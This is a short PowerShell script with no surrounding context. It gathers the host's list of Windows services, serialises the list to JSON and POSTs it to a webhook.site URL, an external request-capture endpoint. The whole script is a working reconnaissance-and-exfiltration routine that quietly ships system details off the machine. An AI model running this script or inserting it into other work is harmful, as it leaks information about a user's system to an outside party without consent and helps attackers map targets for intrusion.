$content = Get-Service
$content = ConvertTo-Json $content
Invoke-WebRequest -Uri https://webhook.site/5acff605-c039-4283-b241-cfd6209663e9 -Method POST -Body $content
